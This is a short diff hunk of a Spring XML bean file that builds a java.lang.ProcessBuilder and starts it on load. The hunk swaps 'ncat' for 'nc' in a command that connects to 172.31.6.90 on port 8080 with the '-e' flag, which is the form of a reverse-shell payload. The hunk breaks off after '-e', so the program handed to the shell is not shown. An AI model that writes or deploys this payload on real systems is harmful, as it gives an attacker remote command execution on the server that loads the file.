@@ -6,7 +6,7 @@
         <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
             <constructor-arg>
             <list>
-                <value>ncat</value>
+                <value>nc</value>
                 <value>172.31.6.90</value>
                 <value>8080</value>
                 <value>-e</value>
